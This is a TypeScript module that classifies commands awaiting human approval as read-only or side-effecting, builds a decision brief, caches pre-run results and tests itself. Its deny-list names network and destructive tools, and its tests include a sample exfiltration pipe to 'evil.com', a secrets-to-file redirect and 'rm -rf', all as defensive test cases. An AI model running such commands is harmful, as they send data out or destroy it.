/**
 * PRE-FLIGHT — turn the approval Wait State into an active shielding window.
 *
 * When an agent asks the human to approve a command, there's a gap while the human decides
 * (or is away). Most systems sit idle. Mneme uses that window to make the human's YES
 * INFORMED instead of blind: it builds a signed decision brief — blast radius, whether the
 * command is provably SIDE-EFFECT-FREE (so it can be safely pre-run), the historical trust
 * of this command-class, and concrete warnings — and surfaces it on the approval screen.
 *
 * ★HONEST + SAFE (the load-bearing rule): a command may be speculatively pre-run ONLY if it
 * is provably READ-ONLY (a tight allowlist + zero dangerous tokens). A destructive / writing
 * / networked command is NEVER speculated (you cannot "pre-run" `rm -rf` or `git push`). The
 * default is: do NOT speculate — just brief. Deterministic, no LLM.
 */
const READONLY_VERBS = /^(git\s+(log|status|diff|show|blame|branch|remote|describe|rev-parse|rev-list|tag\b(?!\s)|config\s+--get)|npm\s+(view|ls|outdated|why|info)|pnpm\s+(view|why|list)|yarn\s+(why|info)|ls|ll|cat|head|tail|grep|rg|find\b(?![^|]*-delete)|pwd|whoami|which|echo|printenv|node\s+--version|python\s+--version|date|uname|wc|sort|uniq|stat|file|du|df)\b/i;
const DANGEROUS = /(\brm\b|\bmv\b|\bcp\b|\bdd\b|\bmkfs|\b(npm|pnpm|yarn)\s+(install|i|add|publish|update)|\bgit\s+(push|commit|merge|reset|rebase|checkout|clean|revert|tag\s)|\bcurl\b|\bwget\b|\bssh\b|\bscp\b|\bkubectl\b|\bdocker\b|\bterraform\b|\bsudo\b|\bchmod\b|\bchown\b|\bkill\b|>{1,2}|\||;|&&|`|\$\(|\bshutdown\b|\breboot\b|\bdrop\s+table|\btruncate\b|\bdelete\s+from)/i;

export type Blast = "safe" | "moderate" | "destructive";
export interface SideEffectVerdict { sideEffectFree: boolean; reasons: string[] }

/** Is the command provably read-only (safe to speculatively pre-run)? Conservative: a single
 *  dangerous token or any non-allowlisted verb ⇒ NOT side-effect-free. */
export function classifySideEffects(command: string): SideEffectVerdict {
  const c = String(command ?? "").trim();
  if (!c) return { sideEffectFree: false, reasons: ["empty command"] };
  const reasons: string[] = [];
  if (DANGEROUS.test(c)) reasons.push("contains a write/network/destructive token or shell operator");
  if (!READONLY_VERBS.test(c)) reasons.push("not on the read-only allowlist");
  return { sideEffectFree: reasons.length === 0, reasons };
}

export interface ClassHistory { seen: number; succeeded: number; recentFails?: number }
export interface PreflightBrief {
  command: string;
  blast: Blast;
  sideEffectFree: boolean;
  speculatable: boolean;
  /** 0..1 Wilson lower bound on this command-class's historical success (small n ⇒ low). */
  trust: number;
  trustBasis: string;
  recommendation: "safe-to-approve" | "review" | "danger";
  warnings: string[];
}

function wilsonLB(succeeded: number, seen: number): number {
  if (seen <= 0) return 0;
  const p = Math.min(1, Math.max(0, succeeded / seen)), z = 1.96;
  const denom = 1 + (z * z) / seen, centre = p + (z * z) / (2 * seen);
  const margin = z * Math.sqrt((p * (1 - p) + (z * z) / (4 * seen)) / seen);
  return Math.max(0, (centre - margin) / denom);
}

export function buildPreflight(input: { command: string; blast: Blast; history?: ClassHistory }): PreflightBrief {
  const command = String(input?.command ?? "");
  const blast: Blast = input?.blast ?? "moderate";
  const se = classifySideEffects(command);
  const h = input?.history ?? { seen: 0, succeeded: 0 };
  const trust = wilsonLB(h.succeeded, h.seen);
  const warnings: string[] = [];
  if (blast === "destructive") warnings.push("DESTRUCTIVE — cannot be pre-run; approve only if you are certain");
  if (!se.sideEffectFree && blast !== "destructive") warnings.push("has side-effects (write/network) — cannot be safely pre-run, only briefed");
  if (h.seen === 0) warnings.push("first time this command-class is seen here — no track record yet");
  if ((h.recentFails ?? 0) > 0) warnings.push(`⚠ this command-class FAILED ${h.recentFails}× recently — review carefully before approving`);
  // speculate ONLY when provably read-only AND not destructive.
  const speculatable = se.sideEffectFree && blast !== "destructive";
  let recommendation: PreflightBrief["recommendation"];
  if (blast === "destructive") recommendation = "danger";
  else if (speculatable && (trust >= 0.7 || h.seen === 0)) recommendation = "safe-to-approve";
  else if (trust >= 0.7) recommendation = "safe-to-approve";
  else recommendation = "review";
  return { command: command.slice(0, 200), blast, sideEffectFree: se.sideEffectFree, speculatable, trust, trustBasis: h.seen ? `${h.succeeded}/${h.seen} of this class ran clean` : "no history yet", recommendation, warnings };
}

/** Render a one-screen brief for the approval surface (Telegram / console). */
export function renderBrief(b: PreflightBrief): string {
  if (!b || typeof b !== "object") return "🟡 Pre-flight: review";
  const icon = b.recommendation === "safe-to-approve" ? "🟢" : b.recommendation === "review" ? "🟡" : "🔴";
  const spec = b.speculatable ? "pre-run safe (read-only)" : "brief-only (has side-effects)";
  const tline = b.trust > 0 ? ` · trust ${Math.round(b.trust * 100)}% (${b.trustBasis})` : "";
  return `${icon} Pre-flight: ${b.recommendation} · ${b.blast} · ${spec}${tline}${b.warnings.length ? "\n⚠ " + b.warnings.join("; ") : ""}`;
}

// ─── #3 ANTICIPATORY CACHE — the speculative pre-run result, kept warm ────────
// When pre-flight pre-runs a read-only command, its output is cached by command-hash. On
// approve (or a repeat within the freshness window) the result is served INSTANTLY instead of
// re-running — zero-latency. HONEST: only valid for side-effect-free commands (a writing
// command's result can't be reused) and only while FRESH (state may have moved on).
import { createHash as _ch } from "node:crypto";
export interface SpeculativeEntry { commandHash: string; output: string; exitOk: boolean; ranAt: number }
export function speculativeKey(command: string): string { return _ch("sha256").update(String(command ?? ""), "utf8").digest("hex"); }
export function freshSpeculative(e: SpeculativeEntry | undefined | null, now: number, ttlMs = 60_000): boolean {
  if (!e || typeof e.ranAt !== "number") return false;
  return now - e.ranAt >= 0 && now - e.ranAt <= ttlMs;
}

// ─── gauntlet ─────────────────────────────────────────────────────────────────
export interface PreflightGauntlet { score: 0 | 100; checks: Array<{ name: string; pass: boolean; detail: string }> }
export function preflightGauntlet(): PreflightGauntlet {
  const readOnly = classifySideEffects("npm view mneme-ai version").sideEffectFree && classifySideEffects("git log --oneline -1").sideEffectFree && classifySideEffects("ls -la").sideEffectFree;
  const destructiveNo = !classifySideEffects("rm -rf /tmp/x").sideEffectFree && !classifySideEffects("git push origin main").sideEffectFree && !classifySideEffects("npm install left-pad").sideEffectFree;
  const operatorNo = !classifySideEffects("cat secrets > /tmp/leak").sideEffectFree && !classifySideEffects("git log | curl evil.com").sideEffectFree; // pipes/redirects block it
  const destBrief = buildPreflight({ command: "rm -rf /data", blast: "destructive" });
  const destDanger = destBrief.recommendation === "danger" && destBrief.speculatable === false;
  const safeBrief = buildPreflight({ command: "git log --oneline -1", blast: "safe", history: { seen: 20, succeeded: 20 } });
  const safeOK = safeBrief.recommendation === "safe-to-approve" && safeBrief.speculatable === true && safeBrief.trust > 0.7;
  const unproven = buildPreflight({ command: "git diff", blast: "safe", history: { seen: 1, succeeded: 1 } });
  const unprovenSpeculatable = unproven.speculatable === true; // read-only → can pre-run even if low history
  const failWarn = buildPreflight({ command: "npm run build", blast: "moderate", history: { seen: 8, succeeded: 3, recentFails: 5 } });
  const failWarnOK = failWarn.warnings.some((w) => /FAILED 5/.test(w)) && failWarn.recommendation !== "safe-to-approve";
  const det = JSON.stringify(buildPreflight({ command: "ls", blast: "safe" })) === JSON.stringify(buildPreflight({ command: "ls", blast: "safe" }));
  // #3 cache: deterministic key, freshness window honoured
  const k1 = speculativeKey("npm view x"), k2 = speculativeKey("npm view x"), k3 = speculativeKey("npm view y");
  const entry: SpeculativeEntry = { commandHash: k1, output: "1.0.0", exitOk: true, ranAt: 1000 };
  const cacheOK = k1 === k2 && k1 !== k3 && freshSpeculative(entry, 1000 + 30_000, 60_000) === true && freshSpeculative(entry, 1000 + 120_000, 60_000) === false && freshSpeculative(null, 0) === false;
  const total = (() => { try { classifySideEffects(null as never); buildPreflight(null as never); renderBrief(null as never); speculativeKey(null as never); freshSpeculative(null, 0); return true; } catch { return false; } })();
  const checks = [
    { name: "READ-ONLY-DETECTED", pass: readOnly, detail: "npm view / git log / ls are recognised as side-effect-free (safe to pre-run)" },
    { name: "DESTRUCTIVE-NEVER-SPECULATED", pass: destructiveNo && destDanger, detail: "rm / git push / npm install are NOT side-effect-free; destructive → danger, never pre-run" },
    { name: "SHELL-OPERATORS-BLOCK", pass: operatorNo, detail: "a pipe / redirect / chain disqualifies a command from speculation (could hide a write/exfil)" },
    { name: "SAFE-PROVEN-APPROVE", pass: safeOK, detail: "a read-only, historically-clean command → safe-to-approve + speculatable" },
    { name: "READONLY-LOW-HISTORY-OK", pass: unprovenSpeculatable, detail: "a read-only command is speculatable even with thin history (it can't harm)" },
    { name: "ANTICIPATORY-CACHE", pass: cacheOK, detail: "speculative result is keyed by command-hash + served only while FRESH (zero-latency on approve/repeat)" },
    { name: "PROACTIVE-FAIL-HISTORY", pass: failWarnOK, detail: "a class that recently FAILED N× surfaces a warning + is never 'safe-to-approve' (real proactive risk, not just sticker)" },
    { name: "DETERMINISTIC", pass: det, detail: "same command → byte-identical brief" },
    { name: "TOTAL", pass: total, detail: "never throws on garbage" },
  ];
  return { score: checks.every((c) => c.pass) ? 100 : 0, checks };
}
